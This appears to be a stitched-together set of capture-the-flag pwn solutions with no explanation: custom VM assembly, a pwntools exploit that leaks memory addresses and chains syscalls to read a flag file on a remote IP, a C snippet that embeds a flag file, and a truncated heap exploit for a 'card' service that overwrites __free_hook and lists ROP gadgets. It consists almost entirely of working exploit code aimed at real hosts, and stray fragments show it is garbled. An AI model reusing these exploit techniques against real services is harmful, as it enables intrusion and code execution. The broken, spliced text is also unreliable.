mov [buf+0x28],a0
lea a0,[buf+0x0]
push a0
pop a1
mov a0, 0x1
mov a2, 0x29
syscall 1 //write
mov a0, 0x656d206c6c657423
mov [buf+0x0],a0
mov a0, 0x7369207461687720
mov [buf+0x8],a0
mov a0, 0x616e2072756f7920
mov [buf+0x10],a0
mov a0, 0x3a656d
mov [buf+0x18],a0
lea a0,[buf+0x0]
push a0
pop a1
mov a0, 0x1
mov a2, 0x1b
syscall 1 //write
mov a0, sp
push a0
pop a1
mov a0, 0x0
mov a2, 0x1000
retopcode
syscall 0 //read
mov a0, sp
syscall 2 //puts
mov a0, 0x20746168772c6b6f
mov [buf+0x0],a0
mov a0, 0x7720756f79206f64
mov [buf+0x8],a0
mov a0, 0x73206f7420746e61
mov [buf+0x10],a0
mov a0, 0x3a7961
mov [buf+0x18],a0
lea a0,[buf+0x0]
push a0
pop a1
mov a0, 0x1
mov a2, 0x1b
syscall 1 //write
mov a0, sp
push a0
pop a1
mov a0, 0x0
mov a2, 0x1000
syscall 0 //read
mov a0, 0x657220492c776f4e
mov [buf+0x0],a0
mov a0, 0x6f79206569766563
mov [buf+0x8],a0
mov a0, 0x617373656d207275
mov [buf+0x10],a0
mov a0, 0xa7e6579622c6567
mov [buf+0x18],a0
lea a0,[buf+0x0]
push a0
pop a1
mov a0, 0x1
mov a2, 0x20
syscall 1 //write
pop256
ret
from pwn import *
io=remote('124.70.153.199',8666)
libc=ELF('./libc-2.23.so')
io.recv()
pay='a'*0x100
io.send(pay)
io.recvuntil('a'*0x100)
elf_base=u64(io.recv(6)+'\x00\x00')-0x203851
pay='b'*0xf0+'d'*0x10+p64(elf_base+0x203020)
io.send(pay)
io.recvuntil('tell me what is your name:')
pay='a'*0xf0
io.send(pay)
io.recvuntil('a'*0xf0)
heap_base=u64(io.recv(6)+'\x00\x00')
# gdb.attach(io)
# success('heap_base:'+hex(heap_base))
# pause()
def call(a,b,c,ord):
  pay1='\x11'
  pay1+=p64(a)
  pay1+='\x12'
  pay1+=p64(b)
  pay1+='\x13'
  pay1+=p64(c)
  pay1+='\x8f'
  if ord==0:
    pay1+='\x00'
  if ord==1:
    pay1+='\x01'
  if ord==2:
    pay1+='\x02'
  return pay1
pay2=call(1,elf_base+0x2038E0,0x8,1)
pay2+=call(0,elf_base+0x2038f8,0x8,0)
pay2+=call(0,heap_base+0x2D18+0x110+87,0x1000,0)
pay=''
print len(pay2)
pay=pay.ljust(0x100,'\x00')+p64(heap_base+0x2D18+0x110)+'\x00'*8
pay+=pay2
io.send(pay)
libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['read']
libc.address=libc_base
system_addr=libc.sym['system']
bin_sh_addr=libc.search('/bin/sh\x00').next()
io.send(p64(libc.sym['open']))
pay=''
pay+='\x11flag\x00\x00\x00\x00'
pay+='\x33'+'\x00'*8
pay+='\x20'+'\x00'*8
pay+='\x12'
pay+=p64(0)
pay+='\x13'
pay+=p64(0)
sandbox
card
pay+='\x8f'
pay+='\x03'
pay+=call(3,heap_base+0x2D18,0x30,0)
pay+=call(1,heap_base+0x2D18,0x30,1)
pay+=call(0,heap_base+0x2D18,0x1000,0)+'\xff'
io.send(pay)
success('libc_base:'+hex(libc_base))
success('heap_base:'+hex(heap_base))
success('elf_base:'+hex(elf_base))
io.interactive()
#include 
#define STR2(x) #x
#define STR(x) STR2(x)
#define INCBIN(name, file) \
    __asm__(".section .rodata\n" \
            ".global incbin_" STR(name) "_start\n" \
            ".type incbin_" STR(name) "_start, @object\n" \
            ".balign 16\n" \
            "incbin_" STR(name) "_start:\n" \
            ".incbin \"" file "\"\n" \
            \
            ".global incbin_" STR(name) "_end\n" \
            ".type incbin_" STR(name) "_end, @object\n" \
            ".balign 1\n" \
            "incbin_" STR(name) "_end:\n" \
            ".byte 0\n" \
    ); \
    extern const __attribute__((aligned(16))) void* incbin_ ## name ## _start; 
\
    extern const void* incbin_ ## name ## _end; \
INCBIN(foobar, "/home/sandbox/flag");
int main()
{
    printf("start = %p\n", &incbin_foobar_start);
    printf("end = %p\n", &incbin_foobar_end);
    printf("size = %zu\n\n\n", (char*)&incbin_foobar_end - 
(char*)&incbin_foobar_start);
    printf("%s", ((unsigned char*)&incbin_foobar_start));
}
editedit
from pwn import *
#p = process('./card')
def add(size):
  p.recvuntil('Choice')
  p.sendline('1')
  p.recvuntil('Size')
  p.sendline(str(size))
def edit(idx,mess):
  p.recvuntil('Choice')
  p.sendline('2')
  p.recvuntil('Index')
  p.sendline(str(idx))
  p.recvuntil('Message')
  p.send(mess)
def edit_3(idx,mess):
  p.recvuntil('Choice')
  p.sendline('5')
  p.recvuntil('Index')
  p.sendline(str(idx))
  p.recvuntil('Message')
  p.send(mess)
def dele(idx):
  p.recvuntil('Choice')
  p.sendline('3')
  p.recvuntil('Index')
  p.sendline(str(idx))
while True:
  try:
    p = remote('119.3.154.59',9777)
    #p = process('./card')
    add(0x50)#0
    add(0x550)#1
    add(0x120)#2
    add(0x120)#3
    dele(1)
    add(0x10)#1
    add(0x10)#4
    add(0x40)#5
    add(0x40)#6
    add(0x40)#7
    add(0x100)#8
    add(0x100)#9
    add(0x100)#10
    add(0x100)#11
    add(0x100)#12
    dele(7)
    dele(6)
    dele(5)
    edit(2,0x20*'a'+'\x00'+'\n')
    edit(4,0x10*'a')
    a =0x66### int(raw_input('a'),16)
    edit_3(1,'\xa0'+chr(a))
    #sleep(0.2)
    add(0x40)#5
    add(0x40)#6
    add(0x40)#7
    edit_3(7,p64(0xfbad3c80)+p64(0)*3+p8(0))
    p.recvuntil('\x80')
    addr = '\x80'+p.recv(5)
    addr = u64(addr.ljust(8,'\x00'))
    print hex(addr)
    libc_base =  addr - (0x00007f4861529980-0x7f486133e000)
    libc = ELF('./libc.so.6')
    hook = libc.sym['__free_hook']+libc_base
    stack_pivot = libc_base+0x1536c0
    print hex(libc_base)
    dele(11)
    dele(10)
    dele(9)
    edit(2,0x110*'a'+p64(hook)+'\x00\n')
    edit(8,0x100*'a')
    add(0x100)#9
    add(0x100)#10
    lev_ret = 0x000000000005aa48 +libc_base
    pop_rdi = 0x0000000000026b72 +libc_base
    pop_rsi = 0x0000000000027529 +libc_base
    pop_rdx = 0x000000000011c1e1 +libc_base